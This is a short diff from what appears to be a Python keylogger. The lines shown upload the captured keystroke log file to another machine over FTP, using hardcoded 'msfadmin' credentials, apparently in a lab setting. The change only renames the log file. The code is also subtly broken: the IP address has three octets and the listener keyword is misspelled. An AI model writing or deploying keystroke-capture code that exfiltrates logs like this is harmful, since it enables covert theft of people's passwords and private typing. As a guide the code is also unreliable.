@@ -29,7 +29,7 @@ with Listener(on_press=pressing_key,on_relase=releasing_key) as listener:
 print("\nConnectiong to the FTP module and sending the data..")
 
 sess= ftplib.FTP("192.168.68", "msfadmin", "msfadmin")
-file = open("klogs.txt","rb")
-sess.storbinary("STOR klogs.txt",file)
+file = open("klogs002.txt","rb")
+sess.storbinary("STOR klogs002.txt",file)
 file.close()
 sess.quit()
